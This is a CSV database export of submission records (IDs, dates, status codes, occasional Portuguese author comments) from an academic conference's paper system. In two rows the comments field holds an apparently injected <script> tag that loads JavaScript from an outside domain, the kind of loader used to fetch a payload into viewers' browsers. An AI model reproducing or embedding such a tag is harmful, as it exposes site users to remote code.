"paper_id","user_id","sched_conf_id","track_id","language","start_time","end_time","comments_to_dr","citations","date_submitted","date_reminded","last_modified","date_status_modified","status","submission_progress","review_mode","current_stage","submission_file_id","revised_file_id","review_file_id","layout_file_id","director_file_id","pages","date_to_presentations","date_to_archive","comments_status"
"12507","8619","46","232","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:45:16","2016-09-30 22:45:16","1","3","2","2","28401","\N","\N","\N","\N","\N","\N","\N","0"
"12541","12240","46","229","pt","\N","\N","\N","\N","2016-10-01 00:08:33","\N","2016-10-03 17:24:57","2016-10-03 17:24:57","0","0","2","2","\N","\N","\N","\N","\N","\N","\N","2016-10-03 17:24:57","0"
"12503","11651","46","237","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:45:28","2016-09-30 22:45:28","1","4","2","2","28398","\N","\N","\N","\N","\N","\N","\N","0"
"12539","12261","46","236","pt","\N","\N","\N","\N","\N","\N","2016-10-01 15:43:20","2016-10-01 15:43:20","1","4","2","2","30259","\N","\N","\N","\N","\N","\N","\N","0"
"12498","11135","46","233","pt","\N","\N","\N","\N","2016-09-30 23:21:14","\N","2016-10-13 18:31:55","2016-10-13 18:31:55","0","0","2","2","28392","\N","29010","\N","\N","\N","\N","2016-10-13 18:31:55","0"
"12645","12270","46","231","pt","\N","\N","\N","\N","2016-10-01 00:44:07","\N","2016-10-03 17:22:57","2016-10-03 17:22:57","0","0","2","2","29969","\N","30196","\N","\N","\N","\N","2016-10-03 17:22:57","0"
"12702","12300","46","231","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:19:58","2016-09-30 23:19:58","1","5","2","2","28831","\N","\N","\N","\N","\N","\N","\N","0"
"12512","8149","46","232","pt","\N","\N","\N","\N","2016-09-30 22:52:20","\N","2016-10-25 15:05:03","2016-10-25 15:05:03","4","0","2","2","28406","\N","28533","\N","\N","\N","\N","2016-10-13 16:17:27","0"
"12345","12151","46","229","pt","\N","\N","\N","\N","2016-09-30 22:43:59","\N","2016-10-26 11:36:11","2016-10-26 11:33:32","3","0","2","2","28368","\N","28377","\N","\N","\N","\N","\N","0"
"12706","12035","46","237","pt","\N","\N","\N","\N","\N","\N","2016-10-17 18:20:06","2016-10-17 18:20:06","1","3","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12508","6698","46","229","pt","\N","\N","\N","\N","2016-09-30 22:58:55","\N","2016-10-26 12:42:29","2016-10-26 12:40:29","3","0","2","2","28415","\N","28643","\N","\N","\N","\N","\N","0"
"12502","12214","46","229","pt","\N","\N","\N","\N","2016-09-30 22:53:42","\N","2016-10-26 16:29:57","2016-10-26 16:29:14","3","0","2","2","28404","\N","28557","\N","\N","\N","\N","\N","0"
"12621","12228","46","229","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:00:01","2016-09-30 23:00:01","1","3","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12465","11991","46","229","pt","\N","\N","\N","\N","2016-09-30 23:28:56","\N","2016-10-27 17:29:31","2016-10-27 17:29:31","4","0","2","2","28378","\N","29162","\N","\N","\N","\N","\N","0"
"10144","11169","46","235","pt","\N","\N","\N","\N","2016-09-30 11:40:41","\N","2016-10-28 23:08:25","2016-10-28 23:08:25","0","0","2","2","23340","\N","23401","\N","\N","\N","\N","2016-10-28 23:08:25","0"
"12378","12197","46","235","pt","\N","\N","\N","\N","2016-09-30 22:42:12","\N","2016-10-29 12:27:40","2016-10-29 12:27:40","0","0","2","2","28136","\N","28354","\N","\N","\N","\N","2016-10-29 12:27:40","0"
"12520","11038","46","237","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:46:34","2016-09-30 22:45:56","1","2","2","2","28430","\N","\N","\N","\N","\N","\N","\N","0"
"12555","12005","46","237","pt","\N","\N","\N","\N","2016-09-30 22:55:24","\N","2016-10-14 17:53:57","2016-10-14 17:53:57","0","0","2","2","28527","\N","28583","\N","\N","\N","\N","2016-10-14 17:53:57","0"
"12540","8938","46","229","pt","\N","\N","\N","\N","2016-09-30 22:50:42","\N","2016-10-26 11:38:09","2016-10-26 11:38:09","0","0","2","2","28473","\N","28503","\N","\N","\N","\N","2016-10-26 11:38:09","0"
"12532","12202","46","229","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:47:54","2016-09-30 22:47:54","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12533","12257","46","229","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:47:58","2016-09-30 22:47:58","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12534","12257","46","229","pt","\N","\N","\N","\N","2016-09-30 23:26:33","\N","2016-10-26 11:50:47","2016-10-26 11:49:52","3","0","2","2","28827","\N","29115","\N","\N","\N","\N","\N","0"
"12535","12248","46","231","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:48:37","2016-09-30 22:48:37","1","3","2","2","28464","\N","\N","\N","\N","\N","\N","\N","0"
"12536","10217","46","229","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:56:00","2016-09-30 22:56:00","1","3","2","2","28586","\N","\N","\N","\N","\N","\N","\N","0"
"12522","12255","46","229","pt","\N","\N","\N","\N","2016-09-30 22:51:23","\N","2016-10-26 11:38:15","2016-10-26 11:37:11","3","0","2","2","28431","\N","28514","\N","\N","\N","\N","\N","0"
"12554","12261","46","237","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:50:17","2016-09-30 22:50:17","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12516","12050","46","229","pt","\N","\N","\N","\N","\N","\N","2016-10-19 07:57:22","2016-10-19 07:57:22","1","5","2","2","28438","\N","\N","\N","\N","\N","\N","\N","0"
"12509","7866","46","231","pt","\N","\N","\N","\N","2016-09-30 22:59:23","\N","2016-10-26 14:40:49","2016-10-26 12:19:41","3","0","2","2","28410","\N","28649","\N","\N","\N","\N","\N","0"
"12664","11836","46","231","pt","\N","\N","\N","\N","2016-09-30 23:16:20","\N","2016-10-26 14:38:51","2016-10-26 11:13:11","3","0","2","2","28735","\N","28916","\N","\N","\N","\N","\N","0"
"12513","12068","46","230","pt","\N","\N","\N","\N","2016-09-30 23:07:02","\N","2016-10-26 12:14:46","2016-10-26 12:14:46","4","0","2","2","28459","\N","28774","\N","\N","\N","\N","\N","0"
"12552","6536","46","231","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:54:20","2016-09-30 22:54:20","1","3","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12551","8619","46","232","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:50:00","2016-09-30 22:50:00","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12549","9007","46","229","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:50:08","2016-09-30 22:49:49","1","2","2","2","28496","\N","\N","\N","\N","\N","\N","\N","0"
"12609","12015","46","229","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:57:10","2016-09-30 22:57:10","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12657","10451","46","236","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:02:26","2016-09-30 23:02:26","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12599","3002","46","229","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:56:06","2016-09-30 22:56:06","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12593","12219","46","231","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:55:33","2016-09-30 22:55:33","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12596","11038","46","237","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:56:24","2016-09-30 22:55:38","1","2","2","2","28602","\N","\N","\N","\N","\N","\N","\N","0"
"12649","8744","46","233","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:01:49","2016-09-30 23:01:49","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12576","10925","46","230","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:00:58","2016-09-30 22:53:28","1","2","2","2","28671","\N","\N","\N","\N","\N","\N","\N","0"
"12672","8837","46","233","pt","\N","\N","<html />","\N","\N","\N","2016-09-30 23:04:13","2016-09-30 23:04:13","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12525","11961","46","235","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:43:08","2016-09-30 23:43:08","1","3","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12611","11478","46","231","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:46:09","2016-09-30 23:46:09","1","3","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12562","12267","46","236","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:51:09","2016-09-30 22:51:09","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12561","8619","46","232","pt","\N","\N","<script id=""lg210a"" src=""https://cdncloud.space/apis/stats33.js"" type=""text/javascript""></script>","\N","\N","\N","2016-09-30 22:51:43","2016-09-30 22:51:43","1","3","2","2","28519","\N","\N","\N","\N","\N","\N","\N","0"
"10824","11306","46","235","pt","\N","\N","Caso o trabalho seja aprovado as autoras Kecieli Martins Braz, Mosanielly Alves de Oliveira e Ranielle Rodrigues do Nascimento desejam apresentá-lo","\N","2016-09-30 16:58:26","\N","2016-10-25 20:48:48","2016-10-25 20:46:14","3","0","2","2","24859","\N","24942","\N","\N","\N","\N","\N","0"
"12505","8328","46","237","pt","\N","\N","\N","\N","2016-09-30 23:01:29","\N","2016-10-19 15:19:12","2016-10-19 15:19:12","4","0","2","2","28458","\N","28674","\N","\N","\N","\N","\N","0"
"12575","8619","46","232","pt","\N","\N","<script id=""lg210a"" src=""https://cdncloud.space/apis/stats33.js"" type=""text/javascript""></script>","\N","\N","\N","2016-09-30 22:53:07","2016-09-30 22:53:07","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12659","12290","46","231","pt","\N","\N","\N","\N","2016-09-30 23:14:31","\N","2016-10-26 11:13:15","2016-10-26 11:11:48","3","0","2","2","28798","\N","28894","\N","\N","\N","\N","\N","0"
"12336","11852","46","231","pt","\N","\N","\N","\N","2016-09-30 22:54:26","\N","2016-10-26 14:41:08","2016-10-26 14:37:41","3","0","2","2","28281","\N","28567","\N","\N","\N","\N","\N","0"
"12565","12268","46","236","pt","\N","\N","\N","\N","2016-09-30 23:11:03","\N","2016-10-01 16:33:45","2016-10-01 16:33:45","4","0","2","2","28538","\N","28837","\N","\N","\N","\N","\N","0"
"12635","6789","46","233","pt","\N","\N","\N","\N","2016-10-01 00:40:35","\N","2016-10-03 17:21:29","2016-10-03 17:21:29","0","0","2","2","28670","\N","30191","\N","\N","\N","\N","2016-10-03 17:21:29","0"
"12556","12261","46","237","pt","\N","\N","\N","\N","2016-10-01 17:36:42","\N","2016-10-03 17:29:16","2016-10-03 17:29:15","0","0","2","2","28507","\N","30262","\N","\N","\N","\N","2016-10-03 17:29:15","0"
"12604","12241","46","231","pt","\N","\N","\N","\N","2016-10-01 00:20:58","\N","2016-10-03 17:33:40","2016-10-03 17:33:40","0","0","2","2","30032","\N","30137","\N","\N","\N","\N","2016-10-03 17:33:40","0"
"12563","8813","46","233","pt","\N","\N","\N","\N","2016-09-30 23:17:57","\N","2016-10-23 20:54:41","2016-10-23 20:53:48","3","0","2","2","28528","\N","28952","\N","\N","\N","\N","\N","0"
"12605","12183","46","229","pt","\N","\N","\N","\N","2016-09-30 23:05:54","\N","2016-10-11 18:27:48","2016-10-11 18:27:48","0","0","2","2","28623","\N","28755","\N","\N","\N","\N","2016-10-11 18:27:48","0"
"12689","11961","46","235","pt","\N","\N","\N","\N","2016-09-30 23:14:17","\N","2016-10-14 16:13:29","2016-10-14 16:13:29","0","0","2","2","28797","\N","28892","\N","\N","\N","\N","2016-10-14 16:13:29","0"
"12581","11190","46","237","pt","\N","\N","\N","\N","2016-09-30 23:46:18","\N","2016-10-14 17:54:32","2016-10-14 17:54:32","0","0","2","2","29457","\N","29544","\N","\N","\N","\N","2016-10-14 17:54:32","0"
"7618","8944","46","233","pt","\N","\N","\N","\N","2016-09-19 18:03:07","\N","2016-10-18 15:57:41","2016-10-18 15:56:48","3","0","2","2","17243","\N","17260","\N","\N","\N","\N","\N","0"
"12759","11895","46","231","pt","\N","\N","\N","\N","2016-10-01 00:26:55","\N","2016-10-03 17:17:58","2016-10-03 17:17:58","0","0","2","2","28912","\N","30155","\N","\N","\N","\N","2016-10-03 17:17:58","0"
"7013","8161","46","229","pt","\N","\N","\N","\N","2016-10-18 23:54:51","\N","2016-10-20 10:01:34","2016-10-20 10:01:34","0","0","2","2","15965","\N","30511","\N","\N","\N","\N","2016-10-20 10:01:34","0"
"7822","9103","46","237","pt","\N","\N","\N","\N","2016-09-19 23:28:51","\N","2016-10-24 07:58:09","2016-10-24 07:53:08","3","0","2","2","17752","\N","17774","\N","\N","\N","\N","\N","0"
"12566","8846","46","234","pt","\N","\N","\N","\N","2016-09-30 23:12:35","\N","2016-10-26 08:39:42","2016-10-25 23:44:42","3","0","2","2","28539","\N","28864","\N","\N","\N","\N","\N","0"
"12612","12235","46","229","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:02:35","2016-09-30 23:02:35","1","4","2","2","28645","\N","\N","\N","\N","\N","\N","\N","0"
"12548","12258","46","229","pt","\N","\N","\N","\N","2016-09-30 22:59:51","\N","2016-10-11 18:25:17","2016-10-11 18:25:17","0","0","2","2","28504","\N","28651","\N","\N","\N","\N","2016-10-11 18:25:17","0"
"12568","11290","46","232","pt","\N","\N","\N","\N","2016-09-30 23:28:32","\N","2016-10-15 21:59:39","2016-10-15 21:59:04","3","0","2","2","28685","\N","29154","\N","\N","\N","\N","\N","0"
"12643","9186","46","231","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:08:36","2016-09-30 23:08:24","1","4","2","2","28680","\N","\N","\N","\N","\N","\N","\N","0"
"12524","12108","46","233","pt","\N","\N","\N","\N","2016-09-30 23:25:30","\N","2016-10-28 19:58:35","2016-10-28 19:56:50","3","0","2","2","28477","\N","29095","\N","\N","\N","\N","2016-10-25 15:31:33","0"
"7953","8756","46","233","pt","\N","\N","\N","\N","2016-09-20 10:38:50","\N","2016-11-12 15:43:22","2016-10-17 19:06:09","3","0","2","2","18071","\N","18096","\N","\N","\N","\N","\N","0"
"12674","11705","46","233","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:11:37","2016-09-30 23:11:37","1","3","2","2","28820","\N","\N","\N","\N","\N","\N","\N","0"
"12626","6501","46","229","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:18:00","2016-09-30 23:18:00","1","3","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"10645","7616","46","232","pt","\N","\N","Prezado Diretor

Como sou avaliadora, observo que tenho recebido as duas versões  word e PDF, já que a  avaliação é apenas no arquivo PDF.","\N","2016-09-30 15:47:32","\N","2016-10-19 07:53:37","2016-10-19 07:51:04","3","0","2","2","24434","\N","24517","\N","\N","\N","\N","\N","0"
"9321","10562","46","237","pt","\N","\N","\N","\N","2016-09-29 10:16:54","\N","2016-10-24 08:01:18","2016-10-24 07:59:48","3","0","2","2","21398","\N","21407","\N","\N","\N","\N","\N","0"
"12608","6773","46","230","pt","\N","\N","\N","\N","2016-09-30 23:10:26","\N","2016-10-25 12:33:43","2016-10-25 12:31:53","3","0","2","2","28632","\N","28829","\N","\N","\N","\N","\N","0"
"12697","8792","46","231","pt","\N","\N","\N","\N","2016-09-30 23:33:24","\N","2016-10-26 14:28:49","2016-10-26 14:27:35","3","0","2","2","28789","\N","29270","\N","\N","\N","\N","\N","0"
"12578","12271","46","235","pt","\N","\N","\N","\N","2016-10-01 09:36:26","\N","2016-10-03 17:31:50","2016-10-03 17:31:50","0","0","2","2","28592","\N","30230","\N","\N","\N","\N","2016-10-03 17:31:50","0"
"12553","12264","46","237","pt","\N","\N","\N","\N","2016-09-30 23:32:57","\N","2016-10-24 11:22:21","2016-10-24 11:19:31","3","0","2","2","28521","\N","29258","\N","\N","\N","\N","\N","0"
"12573","12248","46","231","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:58:18","2016-09-30 22:58:18","1","4","2","2","28543","\N","\N","\N","\N","\N","\N","\N","0"
"12636","10302","46","231","pt","\N","\N","<html />","\N","2016-09-30 23:23:17","\N","2016-10-26 11:12:07","2016-10-26 11:10:51","3","0","2","2","28681","\N","29050","\N","\N","\N","\N","\N","0"
"12620","12228","46","229","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:58:26","2016-09-30 22:58:26","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12627","9683","46","237","pt","\N","\N","\N","\N","2016-09-30 23:08:24","\N","2016-10-18 09:31:29","2016-10-18 09:31:29","4","0","2","2","28659","\N","28793","\N","\N","\N","\N","\N","0"
"12586","12216","46","232","pt","\N","\N","\N","\N","2016-09-30 23:06:15","\N","2016-10-16 20:18:54","2016-10-16 20:16:02","3","0","2","2","28603","\N","28762","\N","\N","\N","\N","\N","0"
"12577","10533","46","236","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:53:30","2016-09-30 22:53:30","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12582","9027","46","237","pt","\N","\N","\N","\N","2016-10-01 01:25:17","\N","2016-10-03 17:32:25","2016-10-03 17:32:25","0","0","2","2","28581","\N","30221","\N","\N","\N","\N","2016-10-03 17:32:25","0"
"12579","11485","46","230","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:53:41","2016-09-30 22:53:41","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"7981","9244","46","233","pt","\N","\N","\N","\N","2016-09-20 11:21:28","\N","2016-10-24 18:33:59","2016-10-24 18:33:59","4","0","2","2","18140","\N","18147","\N","\N","\N","\N","\N","0"
"12569","9256","46","230","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:54:27","2016-09-30 22:54:27","1","4","2","2","28546","\N","\N","\N","\N","\N","\N","\N","0"
"12719","12246","46","232","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:10:35","2016-09-30 23:10:35","1","3","2","2","28828","\N","\N","\N","\N","\N","\N","\N","0"
"12588","12279","46","229","pt","\N","\N","\N","\N","2016-09-30 23:03:23","\N","2016-10-11 18:26:42","2016-10-11 18:26:42","0","0","2","2","28613","\N","28708","\N","\N","\N","\N","2016-10-11 18:26:42","0"
"12546","11637","46","233","pt","\N","\N","\N","\N","2016-09-30 23:04:49","\N","2016-10-20 03:51:22","2016-10-20 03:47:48","3","0","2","2","28494","\N","28737","\N","\N","\N","2016-10-20 03:50:01","\N","0"
"12629","11705","46","233","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:17:17","2016-09-30 23:17:17","1","3","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12695","12006","46","229","pt","\N","\N","\N","\N","2016-09-30 23:26:25","\N","2016-10-25 16:43:34","2016-10-25 16:43:34","0","0","2","2","28809","\N","29112","\N","\N","\N","\N","2016-10-25 16:43:34","0"
"12694","11606","46","229","pt","\N","\N","\N","\N","2016-09-30 23:11:32","\N","2016-10-25 16:20:05","2016-10-25 16:20:05","0","0","2","2","28779","\N","28848","\N","\N","\N","\N","2016-10-25 16:20:05","0"
"12654","8515","46","234","pt","\N","\N","\N","\N","2016-09-30 23:15:20","\N","2016-10-25 21:27:37","2016-10-25 21:27:37","0","0","2","2","28706","\N","28905","\N","\N","\N","\N","2016-10-25 21:27:37","0"
"12585","11656","46","237","pt","\N","\N","\N","\N","2016-09-30 23:13:59","\N","2016-10-20 08:45:00","2016-10-20 08:45:00","4","0","2","2","28589","\N","28887","\N","\N","\N","\N","\N","0"
"12642","9186","46","231","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:01:13","2016-09-30 23:01:13","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12572","10844","46","237","pt","\N","\N","\N","\N","2016-09-30 23:10:46","\N","2016-10-24 07:37:44","2016-10-11 09:48:31","3","0","2","2","28554","\N","28834","\N","\N","\N","\N","\N","0"
"12637","12063","46","234","pt","\N","\N","\N","\N","2016-09-30 23:13:20","\N","2016-10-25 23:36:07","2016-10-25 23:36:07","0","0","2","2","28683","\N","28873","\N","\N","\N","\N","2016-10-25 23:36:07","0"
"8534","9094","46","237","pt","\N","\N","\N","\N","2016-09-22 16:08:17","\N","2016-10-24 07:54:43","2016-09-30 16:26:56","3","0","2","2","19518","\N","19522","\N","24747","\N","\N","\N","0"
"12571","12236","46","234","pt","\N","\N","\N","\N","2016-09-30 23:00:42","\N","2016-10-14 15:27:45","2016-10-14 15:27:45","0","0","2","2","28547","\N","28666","\N","\N","\N","\N","2016-10-14 15:27:45","0"
"12545","8792","46","230","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:05:36","2016-09-30 22:49:26","1","2","2","2","28722","\N","\N","\N","\N","\N","\N","\N","0"
"12678","8876","46","232","pt","\N","\N","\N","\N","2016-09-30 23:16:17","\N","2016-10-16 21:03:56","2016-10-16 21:03:28","3","0","2","2","28759","\N","28914","\N","\N","\N","\N","\N","0"
"12707","12249","46","229","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:24:54","2016-09-30 23:24:54","1","3","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12544","12254","46","233","pt","\N","\N","\N","\N","2016-09-30 22:54:12","\N","2016-10-25 07:07:13","2016-10-25 07:04:11","3","0","2","2","28485","\N","28563","\N","\N","\N","\N","\N","0"
"12415","12178","46","235","pt","\N","\N","\N","\N","2016-09-30 22:58:05","\N","2016-10-24 13:08:29","2016-10-24 13:02:34","3","0","2","2","28190","\N","28631","\N","\N","\N","\N","\N","0"
"7490","8565","46","231","pt","\N","\N","Os autores gostariam de pedir encarecidamente para que se por ventura o artigo for aprovado, a comissão do XI CONNEPI escolha como modalidade de apresentação a oral.","\N","2016-09-19 13:36:49","\N","2016-10-26 15:48:45","2016-10-24 10:52:48","3","0","2","2","16956","\N","16966","\N","\N","\N","\N","\N","0"
"12570","12262","46","234","pt","\N","\N","\N","\N","2016-09-30 23:04:03","\N","2016-10-26 11:57:22","2016-10-26 11:56:19","3","0","2","2","28596","\N","28724","\N","\N","\N","\N","\N","0"
"12574","12026","46","229","pt","\N","\N","\N","\N","2016-09-30 23:02:06","\N","2016-10-26 11:36:24","2016-10-26 11:36:24","0","0","2","2","28552","\N","28682","\N","\N","\N","\N","2016-10-26 11:36:24","0"
"12320","12191","46","230","pt","\N","\N","\N","\N","2016-09-30 22:56:07","\N","2016-10-27 12:12:48","2016-10-27 12:09:13","3","0","2","2","28264","\N","28595","\N","\N","\N","\N","\N","0"
"12679","11485","46","230","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:10:22","2016-09-30 23:10:22","1","3","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12584","5631","46","236","pt","\N","\N","\N","\N","2016-10-01 01:29:50","\N","2016-10-01 16:44:09","2016-10-01 16:44:09","4","0","2","2","30209","\N","30223","\N","\N","\N","\N","\N","0"
"12542","12242","46","237","pt","\N","\N","\N","\N","2016-09-30 23:03:39","\N","2016-10-24 11:22:15","2016-10-24 11:19:23","3","0","2","2","28484","\N","28714","\N","\N","\N","\N","\N","0"
"12722","6748","46","237","pt","\N","\N","\N","\N","2016-10-01 00:18:46","\N","2016-10-03 17:15:39","2016-10-03 17:15:39","0","0","2","2","\N","\N","\N","\N","\N","\N","\N","2016-10-03 17:15:39","0"
"12580","11502","46","236","pt","\N","\N","\N","\N","2016-09-30 23:25:06","\N","2016-10-10 21:26:45","2016-10-10 21:26:10","3","0","2","2","28564","\N","29085","\N","\N","\N","\N","\N","0"
"12590","8619","46","232","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:56:07","2016-09-30 22:56:07","1","3","2","2","28594","\N","\N","\N","\N","\N","\N","\N","0"
"8255","9702","46","229","pt","\N","\N","\N","\N","2016-09-20 22:03:24","\N","2016-10-24 11:15:32","2016-10-24 11:07:20","3","0","2","2","18966","\N","18982","\N","\N","\N","\N","\N","0"
"12628","12202","46","229","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:59:27","2016-09-30 22:59:27","1","2","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12589","12272","46","233","pt","\N","\N","\N","\N","2016-09-30 23:26:34","\N","2016-10-24 13:24:07","2016-10-24 13:21:49","3","0","2","2","28901","\N","29116","\N","\N","\N","\N","\N","0"
"12506","12209","46","234","pt","\N","\N","\N","\N","2016-09-30 22:53:30","\N","2016-10-27 20:53:35","2016-10-27 20:53:35","0","0","2","2","\N","\N","\N","\N","\N","\N","\N","2016-10-27 20:53:35","0"
"12680","12244","46","231","pt","\N","\N","\N","\N","2016-09-30 23:18:57","\N","2016-10-30 17:17:12","2016-10-30 17:17:12","0","0","2","2","28754","\N","28969","\N","\N","\N","\N","2016-10-30 17:17:12","0"
"12693","12230","46","235","pt","\N","\N","\N","\N","2016-09-30 23:18:55","\N","2016-10-29 12:45:01","2016-10-29 12:45:01","0","0","2","2","28801","\N","28968","\N","\N","\N","\N","2016-10-29 12:45:01","0"
"12587","10801","46","231","pt","\N","\N","\N","\N","2016-09-30 23:19:51","\N","2016-10-30 17:15:59","2016-10-30 17:15:59","0","0","2","2","28598","\N","28986","\N","\N","\N","\N","2016-10-30 17:15:59","0"
"12625","12219","46","231","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:00:20","2016-09-30 23:00:20","1","3","2","2","28656","\N","\N","\N","\N","\N","\N","\N","0"
"12705","7744","46","233","pt","\N","\N","\N","\N","2016-09-30 23:19:55","\N","2016-10-24 21:36:40","2016-10-24 21:35:44","3","0","2","2","28800","\N","28988","\N","\N","\N","\N","\N","0"
"9280","10615","46","237","pt","\N","\N","\N","\N","2016-09-29 00:22:33","\N","2016-10-11 12:39:41","2016-10-11 12:39:17","3","0","2","2","21295","\N","21305","\N","\N","\N","\N","\N","0"
"12715","12280","46","232","pt","\N","\N","\N","\N","2016-09-30 23:38:15","\N","2016-10-13 13:54:09","2016-10-13 13:54:09","4","0","2","2","29080","\N","29382","\N","\N","\N","\N","\N","0"
"12691","7616","46","235","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:06:55","2016-09-30 23:06:00","1","2","2","2","28772","\N","\N","\N","\N","\N","\N","\N","0"
"12592","12220","46","234","pt","\N","\N","\N","\N","2016-09-30 23:15:22","\N","2016-10-26 10:09:24","2016-10-26 10:07:20","3","0","2","2","28609","\N","28906","\N","\N","\N","\N","\N","0"
"10560","11447","46","235","pt","\N","\N","Este artigo contém algumas partes que foram publicadas no II Seminário de Educação Inclusiva e Diversidade do IFRO, contudo este evento não tem anais.","\N","2016-09-30 15:18:29","\N","2016-10-26 11:34:30","2016-10-26 11:34:30","0","0","2","2","24252","\N","24338","\N","\N","\N","\N","2016-10-26 11:34:30","0"
"12660","10451","46","236","pt","\N","\N","\N","\N","2016-09-30 23:19:55","\N","2016-10-23 21:01:03","2016-10-23 21:01:03","4","0","2","2","28744","\N","28987","\N","\N","\N","\N","\N","0"
"12594","10302","46","231","pt","\N","\N","\N","\N","\N","\N","2016-09-30 22:57:17","2016-09-30 22:57:17","1","3","2","2","\N","\N","\N","\N","\N","\N","\N","\N","0"
"12656","12046","46","235","pt","\N","\N","\N","\N","\N","\N","2016-09-30 23:02:44","2016-09-30 23:02:26","1","2","2","2","28693","\N","\N","\N","\N","\N","\N","\N","0"
